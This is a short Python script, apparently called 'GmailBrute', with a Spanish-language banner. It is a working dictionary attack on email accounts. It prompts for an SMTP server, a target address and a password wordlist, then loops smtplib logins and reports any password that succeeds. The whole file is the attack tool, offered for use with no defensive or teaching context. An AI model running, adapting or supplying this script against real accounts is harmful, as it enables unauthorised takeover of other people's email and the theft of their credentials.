import os
import smtplib
import sys
import os
os.system('clear')
verde = "\033[1;32m"
rojo = "\033[1;31m"
banner = """\033[1;32m
 _______                   __  __  ______               __          
|     __|.--------..---.-.|__||  ||   __ \.----..--.--.|  |_ .-----.
|    |  ||        ||  _  ||  ||  ||   __ <|   _||  |  ||   _||  -__|
|_______||__|__|__||___._||__||__||______/|__|  |_____||____||_____|
   \033[1;34m           ====================================\033[0m
                     Creado por Hector Diaz
 \033[1;34m             ====================================\033[0m"""

print(banner)
options = """
\033[1;32m[\033[0mSigueme en\033[1;32m]\033[0m https://github.com/Kris011 \033[1;32m[\033[0m+\033[1;32m]\033[0m Enjoy
"""
actos = "Has Seleccionado"
print(options)
service = input("[servicio: ")
HOST = service
server = smtplib.SMTP(HOST)
server.ehlo()
server.starttls()
user = input("[correo: ")
file = input("[Archivo de contrasenas:  ")
passwordFile = open(file, "r")

for password in passwordFile:
    password = password.strip('\n')
    try:
        server.login(user, password)
        print(f'{verde}[+] Contrasena encontrada: %s' % password) 
    except smtplib.SMTPAuthenticationError:
        print(f'{rojo}[-] Encontrando Contrasena: %s' % password)
